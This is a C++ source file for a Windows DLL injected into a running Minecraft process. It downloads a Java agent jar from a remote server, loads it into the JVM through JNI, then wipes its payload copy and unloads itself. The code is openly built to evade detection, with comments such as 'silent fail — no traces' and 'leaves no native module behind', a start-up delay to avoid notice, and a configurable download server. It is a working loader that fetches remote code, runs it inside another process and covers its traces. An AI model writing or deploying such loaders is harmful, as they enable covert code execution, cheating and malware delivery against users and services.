// language: C++20, target: Windows 11, MSVC or MinGW-w64
// DLL entry point — injected into Minecraft via System Informer "Load module"
// spawns worker thread → finds JVM → downloads agent → loads via JNI → self-unloads

#include <windows.h>
#include "jvm_bridge.h"
#include "downloader.h"

static HMODULE g_self = nullptr;

static DWORD WINAPI worker(LPVOID param) {
    // small jitter before starting — don't spike immediately after inject
    Sleep(500 + (GetTickCount() % 300));

    // download agent jar bytes from remote server
    std::vector<uint8_t> payload;
    // ---- CONFIGURE THIS: your server URL ----
    const wchar_t* host = L"127.0.0.1";
    const wchar_t* path = L"/agent.jar";
    int port = 8443;
    bool use_tls = true;

    if (!download_payload(host, path, port, use_tls, payload) || payload.empty()) {
        // silent fail — no traces
        FreeLibraryAndExitThread(g_self, 0);
        return 0;
    }

    // find JVM in this process and load the payload
    if (!jvm_load_agent(payload.data(), static_cast<int>(payload.size()))) {
        // silent fail
        FreeLibraryAndExitThread(g_self, 0);
        return 0;
    }

    // payload is running inside the JVM now — wipe our copy
    SecureZeroMemory(payload.data(), payload.size());
    payload.clear();

    // unload this DLL from the process — leaves no native module behind
    // small delay so the thread can finish cleanly
    Sleep(100);
    FreeLibraryAndExitThread(g_self, 0);
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);
        g_self = hModule;
        HANDLE t = CreateThread(nullptr, 0, worker, nullptr, 0, nullptr);
        if (t) CloseHandle(t);
    }
    return TRUE;
}
